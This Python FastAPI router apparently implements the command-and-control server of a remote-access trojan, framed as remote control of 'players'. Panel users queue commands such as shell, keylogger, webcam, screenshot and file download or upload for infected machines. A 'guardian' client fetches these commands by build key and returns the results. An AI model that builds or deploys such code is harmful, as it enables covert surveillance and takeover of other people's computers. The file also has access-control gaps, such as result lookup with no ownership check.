from typing import Any, List, Dict
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User
from app.services.stream_manager import stream_manager
from app.api.v1.endpoints.online import online_players
from datetime import datetime
import asyncio

router = APIRouter()

# Command queue per player - {player_name: [{'id': int, 'cmd': str, 'type': str, 'user_id': int}]}
command_queue: Dict[str, List[dict]] = {}
command_results: Dict[int, dict] = {}
command_counter = 0

@router.get("/players")
def get_remote_players(
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Get players available for remote control"""
    result = []
    
    for player_name, data in online_players.items():
        # Admin sees all, others only their own
        if current_user.is_admin or data.get('user_id') == current_user.id:
            # Check if guardian is connected via websocket
            stats = stream_manager.get_stats(player_name)
            is_connected = stats is not None
            
            result.append({
                "name": player_name,
                "pc_name": data.get('pc_name', 'Unknown'),
                "pc_user": data.get('pc_user', 'Unknown'),
                "connected": is_connected,
                "streaming": stats.get('streaming', False) if stats else False,
                "stream_type": stats.get('type') if stats else None
            })
    
    return {
        "success": True,
        "players": result,
        "count": len(result)
    }

@router.get("/commands")
def list_pending_commands(
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """List pending commands for panel users"""
    result = []
    # Flatten command_queue and respect ownership
    for player_name, commands in command_queue.items():
        for cmd in commands:
            # Check ownership: admin sees all, others only their own
            player_data = online_players.get(player_name, {})
            if current_user.is_admin or player_data.get('user_id') == current_user.id:
                cpy = cmd.copy()
                cpy['player'] = player_name
                result.append(cpy)

    return {"success": True, "commands": result, "count": len(result)}

@router.post("/command")
async def send_remote_command(
    data: dict,
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Send command to a player"""
    global command_counter
    
    # Support both field name formats
    player_name = data.get('player') or data.get('target_player')
    cmd_type = data.get('type') or data.get('command_type')  # shell, screenshot, keylogger, webcam, files, download, upload
    cmd_data = data.get('data') or data.get('command_data', {})
    
    if not player_name:
        raise HTTPException(status_code=400, detail="Player name required")
    
    if not cmd_type:
        raise HTTPException(status_code=400, detail="Command type required")
    
    # Check if player exists and belongs to user
    if player_name not in online_players:
        raise HTTPException(status_code=404, detail="Player not online")
    
    player_data = online_players[player_name]
    if not current_user.is_admin and player_data.get('user_id') != current_user.id:
        raise HTTPException(status_code=403, detail="Not authorized to control this player")
    
    # Create command
    command_counter += 1
    cmd_id = command_counter
    
    command = {
        'id': cmd_id,
        'type': cmd_type,
        'data': cmd_data,
        'user_id': current_user.id,
        'created_at': datetime.now().isoformat()
    }
    
    if player_name not in command_queue:
        command_queue[player_name] = []
    command_queue[player_name].append(command)
    
    return {
        "success": True,
        "command_id": cmd_id,
        "message": f"Command queued for {player_name}"
    }

@router.get("/poll/{build_key}/{player_name}")
def poll_commands(
    build_key: str,
    player_name: str,
    db: Session = Depends(get_db),
) -> Any:
    """Guardian polls for pending commands"""
    # Validate build key
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")
    
    # Update last seen
    if player_name in online_players:
        online_players[player_name]['last_seen'] = datetime.now()
    
    # Get pending commands
    commands = command_queue.get(player_name, [])
    command_queue[player_name] = []  # Clear after fetching
    
    return {
        "success": True,
        "commands": commands
    }

@router.post("/result/{build_key}/{command_id}")
async def submit_command_result(
    build_key: str,
    command_id: int,
    data: dict,
    db: Session = Depends(get_db),
) -> Any:
    """Guardian submits command result"""
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")
    
    command_results[command_id] = {
        'result': data.get('result'),
        'status': data.get('status', 'completed'),
        'completed_at': datetime.now().isoformat()
    }
    
    return {"success": True}

@router.get("/result/{command_id}")
def get_command_result(
    command_id: int,
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Get result of a command"""
    if command_id not in command_results:
        return {"success": True, "status": "pending", "result": None}
    
    return {
        "success": True,
        **command_results[command_id]
    }
